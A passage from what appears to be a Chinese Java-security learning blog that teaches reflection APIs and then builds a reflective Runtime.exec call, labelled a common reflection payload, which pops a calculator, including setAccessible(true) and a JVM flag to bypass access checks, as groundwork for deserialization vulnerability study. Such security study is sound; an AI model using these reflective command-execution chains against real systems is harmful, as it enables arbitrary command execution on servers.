main(String[] args) { try { Class c = Class.forName(\u0026#34;com.dan.MethodTest\u0026#34;); // 创建Class对象 Method[] methods1 = c.getDeclaredMethods(); // 获取所有该类中的所有方法 Method[] methods2 = c.getMethods(); // 获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法 for (Method m:methods1) { System.out.println(m.); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); for (Method m:methods2) { System.out.println(m); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); Method methods3 = c.getMethod(\u0026#34;study\u0026#34;, String.class); // 获取study方法 System.out.println(methods3); System.out.println(\u0026#34;-------分割线---------\u0026#34;); Method method4 = c.getDeclaredMethod(\u0026#34;sleep\u0026#34;, int.class); // 获取sleep方法 System.out.println(method4); } catch (Exception e) { e.printStackTrace(); } } } 运行结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //public static void com.dan.MethodTest.main(java.lang.String[]) //protected void com.dan.MethodTest.run() //private java.lang.String com.dan.MethodTest.sleep(int) //public void com.dan.MethodTest.study(java.lang.String) //void com.dan.MethodTest.eat() //-------分割线--------- //public static void com.dan.MethodTest.main(java.lang.String[]) //public void com.dan.MethodTest.study(java.lang.String) //public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException //public final void java.lang.Object.wait() throws java.lang.InterruptedException //public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException //public boolean java.lang.Object.equals(java.lang.Object) //public java.lang.String java.lang.Object.toString() //public native int java.lang.Object.hashCode() //public final native java.lang.Class java.lang.Object.getClass() //public final native void java.lang.Object.notify() //public final native void java.lang.Object.notifyAll() //-------分割线--------- //public void com.dan.MethodTest.study(java.lang.String) //-------分割线--------- //private java.lang.String com.dan.MethodTest.sleep(int) // //Process finished with exit code 0 获取构造函数 Constructor\u003c?\u003e[] getConstructors() ：只返回public构造函数\nConstructor\u003c?\u003e[] getDeclaredConstructors() ：返回所有构造函数\nConstructor\u0026lt;\u0026gt; getConstructor(类\u003c?\u003e\u0026hellip; parameterTypes) : 匹配和参数配型相符的public构造函数\nConstructor\u0026lt;\u0026gt; getDeclaredConstructor(类\u003c?\u003e\u0026hellip; parameterTypes) ： 匹配和参数配型相符的构造函数\n例子总比文字好理解：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import java.lang.reflect.Constructor; public class ConstructorTest { public ConstructorTest() { System.out.println(\u0026#34;无参构造函数\u0026#34;); } public ConstructorTest(String name) { System.out.println(\u0026#34;有参构造函数\u0026#34; + name); } private ConstructorTest(boolean n) { System.out.println(\u0026#34;私有构造函数\u0026#34;); } public static void main(String[] args) { try { Class c1 = Class.forName(\u0026#34;com.dan.ConstructorTest\u0026#34;); Constructor[] constructors1 = c1.getDeclaredConstructors(); Constructor[] constructors2 = c1.getConstructors(); for (Constructor c : constructors1) { System.out.println(c); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); for (Constructor c : constructors2) { System.out.println(c); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); Constructor constructors3 = c1.getConstructor(String.class); System.out.println(constructors3); System.out.println(\u0026#34;-------分割线---------\u0026#34;); Constructor constructors4 = c1.getDeclaredConstructor(boolean.class); System.out.println(constructors4); } catch (Exception e) { e.printStackTrace(); } } } 获取对象 先获取类的 Class 对象实例 Class clz = Class.forName(\u0026quot;com.api.Apple\u0026quot;);\n根据 Class 对象实例获取 Constructor 函数 Constructor appleConstructor = clz.getConstructor();\n使用 Constructor 对象的 newInstance 方法获取反射类对象 Apple appleObj = (Apple)appleConstructor.newInstance();\n或者也可以使用 Class对象 的newInstance()方法来进行创建类对象\nApple appleObj = (Apple)clz.newInstance();\n区别在于通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。下面的代码是使用一个有参数的构造方法进行了类对象的初始化\n1 2 3 Class clz = Apple.class; Constructor constructor = clz.getConstructor(String.class, int.class); Apple apple = (Apple)constructor.newInstance(\u0026#34;红富士\u0026#34;, 15); 常用的是如下实例：\n1 2 Class clz = Class.forName(\u0026#34;com.api.Apple\u0026#34;); // 创建Class对象 Apple appleObj = (Apple) clz.newInstance(); // 创建类对象 调用方法步骤 获取对象使用的是 newInstance()，那么调用函数使用的就是invoke()\ninvoke方法位于java.lang.reflect.Method类中，用于执行某个的对象的目标方法。一般会和getMethod方法配合进行调用。\ninvoke使用小Tips：\npublic Object invoke(Object obj, Object... args)\nobj：从中调用底层方法的对象，必须是实例化对象 如果调用的这个方法是普通方法**，**第一个参数就是目标类实例化对象； 如果调用的这个方法是静态方法，第一个参数就是Class对象；\nargs： 用于方法的调用，是一个object的数组，参数有可能是多个\n基本步骤\n获取类的 Class 对象实例 Class clz = Class.forName(\u0026quot;com.api.Apple\u0026quot;);\n获取方法的 Method 对象 Method setPriceMethod = clz.getMethod(\u0026quot;setPrice\u0026quot;, int.class);\n利用 Method 对象的 invoke 方法调用方法（本例子需要提前准备实例化对象） setPriceMethod.invoke(appleObj, 14);\n调用方法完整小例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.dan; import java.lang.reflect.Method; public class ReflectTest { public void reflectMethod() { System.out.println(\u0026#34;反射测试成功!!!\u0026#34;); } public static void main(String[] args) { try { Class c = Class.forName(\u0026#34;com.dan.ReflectTest\u0026#34;); // 创建Class对象 Object m = c.newInstance(); // 创建类实例对象 Method method = c.getMethod(\u0026#34;reflectMethod\u0026#34;); // 获取reflectMethod方法 method.invoke(m); // 调用类实例对象方法 } catch (Exception e) { e.printStackTrace(); } } } ​\t上面讲述了反射机制流程概念和基本使用方法，从Class对象获取，到获取成员变量、成员方法和构造函数，接着是newInstance创建类对象和invoke方法，最后是一个简单反射例子的组成。\n回归到漏洞学习中，看看如何使用java反射中如何获取Runtime类来命令执行\n1 2 3 4 5 6 7 8 9 10 import java.lang.reflect.Method; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Object b = a.newInstance(); Method c = a.getMethod(\u0026#34;exec\u0026#34;,String.class); c.invoke(b,\u0026#34;calc\u0026#34;); } } 上面的例子会报错：\n但我们发现了使用newInstance产生了报错的话，而往往其可能是以下原因未能实现。\n1、使用的类没有无参构造函数 2、使用的类构造函数是私有的\n构造函数私有化 上例报错是因为构造函数私有，构造函数私有有如下作用：\n单例模式\n单例模式主要有3个特点：\n类的内部包括一个类的实例，并且为static类型\n构造函数为私有\n通过提供一个获取实例的方法，比如getInstance，该方法也为static类型。 调用的时候，我们可以通过某些特殊静态函数例如Singleton instance = Singleton.getInstance();来获得实例化的对象\n单例模式的使用： 很多时候，我们只需要一个对象就可以了，不希望用户来构造对象，比如线程池，驱动，显示器等。如果把构造函数私有，那么很多程序都可以得到其实例，将会带来混乱。\n防止实例化\n在Java的工具类中，有很多就是利用这种方法\n一个工具类Utils，里面含有很多静态函数或者静态变量，由于静态的原因，我们完全可以通过类名来访问，这样，我们就没有必要实例化它们，所以我们可以将其构造函数设置为私有，这样就防止用户滥用。\nRuntime也是一个工具类，所以构造函数有私有的必要\n那我们应该怎么构造呢？原本弹计算器应该是这样的：\nRuntime.getRuntime().exec(\u0026quot;calc\u0026quot;);\n可以看到是通过getRuntime()方法获得的实例化对象\n那么我们可以先使用反射调用静态方法获得对象后再执行exec()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.lang.reflect.Method; public class CommandExc { public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); // Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); // Object b = a.newInstance(); // Method c = a.getMethod(\u0026#34;exec\u0026#34;,String.class); // c.invoke(b,\u0026#34;calc\u0026#34;); Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method rundan = a.getMethod(\u0026#34;getRuntime\u0026#34;); Object b = rundan.invoke(a); Method run1 = a.getMethod(\u0026#34;exec\u0026#34;, String.class); run1.invoke(b,\u0026#34;calc\u0026#34;); } } 此例便可以弹出计算机了\n如果将这些代码简化一下，就可以得到\n1 2 Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); a.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(a.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(a),\u0026#34;calc\u0026#34;); 常见的反射payload\n如果就想使用newInstance()来获得构造呢，在之前获得对象中有提到\n使用 Constructor 对象的 newInstance 方法获取反射类对象\n所以可以先试试\n1 2 3 4 5 6 7 8 9 10 11 import java.lang.reflect.Constructor; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor cs = a.getDeclaredConstructor(); System.out.println(cs); Object o = cs.newInstance(); a.getMethod(\u0026#34;exec\u0026#34;, String[].class).invoke(o,\u0026#34;calc\u0026#34;); } } 但是依旧报错：\n佬说需要通过setAccessible(true)来突破访问权限的检查\n​\t在一般情况下，我们使用反射机制不能对类的私有private字段进行操作，绕过私有权限的访问。但一些特殊场景存在例外的时候，比如我们进行序列化操作的时候，需要去访问这些受限的私有字段，这时我们可以通过调用AccessibleObject上的setAccessible()方法来允许访问。\n​\tJava.lang.reflect.AccessibleObject 类是Field，Method和Constructor类对象的基类，它提供了标记反射对象的能力，以抑制在使用时使用默认Java语言访问控制检查，从而能够任意调用被私有化保护的方法、域和构造函数，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作。\nsetAccessible()是AccessibleObject类的public函数，该类被Executable继承，之后Executable又被Constructor继承\n所以可以使用Field，Method和Constructor类的实例化对象去访问该函数，代码改进为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.lang.reflect.Constructor; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor cs = a.getDeclaredConstructor(); cs.setAccessible(true); Object o = cs.newInstance(); a.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(o,\u0026#34;calc\u0026#34;); } } 还是报错，，，，\n猜测是Java版本过新，解决办法：\n如果没有类似我一样的方框的话，找到 Modify options ，去里面把\n这个勾选上就有了，方框里填--add-opens java.base/java.lang=ALL-UNNAMED\n最后运行，成功弹出计算器\n​\t在实际利用场景当中，我们通常利用Java反射机制来绕过一些安全权限机制检查，如获取private权限的方法和属性。本质就是我们绕过访问安全检查。所以通过java反射机制的学习，能够为我们为我们后面的java漏洞分析调试，java漏洞poc测试和服务端模板引擎注入等有着十分重要的意义。\n泛型 关于泛型的介绍可以参考链接（Java泛型详解，史上最全图文详解）\n相关补充 Field类粗略理解\n​\tJava中的Field类是反射机制的一部分，它的设计初衷是为了在运行时动态地获取和操作类的成员变量，包括私有变量。使用Field类可以获取类中的所有变量信息，包括变量名、类型、访问修饰符等，并可以通过它们进行读取、修改或设置新的值。 ​\tField类的设计使得开发者可以在运行时获取和操作类的成员变量，这在某些情况下是非常有用的，例如：\n当需要通过反射获取或设置某个类的私有变量时； 当需要动态地创建对象或者通过反射调用对象的方法时，需要访问对象中的成员变量； 当需要实现某些自定义的序列化或者反序列化机制时，需要获取或设置对象中的成员变量。 因此，Field类的设计初衷是为了提供一种方便的方式，使得开发者可以在运行时动态地获取和操作类的成员变量。\nSerialCallbackContext类理解\nctx 是一个 SerialCallbackContext 类对象， SerialCallbackContext类是内部类，无法在包（java.io）外引用，且该类为final，无法被继承，该类的描述：\n大意就是\n从对象流向上调用类定义的readObject/writeObject方法时的上下文。保存当前被反序列化的对象和当前类的描述符。这个上下文跟踪构造它的线程，并且只允许一个defaultReadObject, readFields, defaultWriteObject或writeFields的调用，这些必须在类的readObject/writeObject方法返回之前在同一个线程上调用。如果未设置为当前线程，getObj方法将抛出NotActiveException。\n有如下成员变量：\n被操作的Object，内含的对象流类，当前操作线程\n1 2 3 private final Object obj; private final ObjectStreamClass desc; private Thread thread; 参考链接 Java反序列化漏洞从入门到深入\nJAVA反序列化漏洞基础原理\nJava 中序列化与反序列化，看这篇就够了！\nJava 日看一类（53）之IO包中的SerialCallbackContext类\nJava I/O 25 - BlockDataInputStream\n大白话说Java反射：入门、使用、原理\nJAVA安全基础（二）\u0026ndash; 反射机制\nJava私有构造函数的使用\nJava泛型详解，史上最全图文详解\n","date":"2023-04-06T00:00:00Z","permalink":"https://d4n-sec.github.io/p/d4n%E7%9A%84java%E5%AE%89%E5%85%A8%E8%B7%AF/","title":"D4n的Java安全路"}]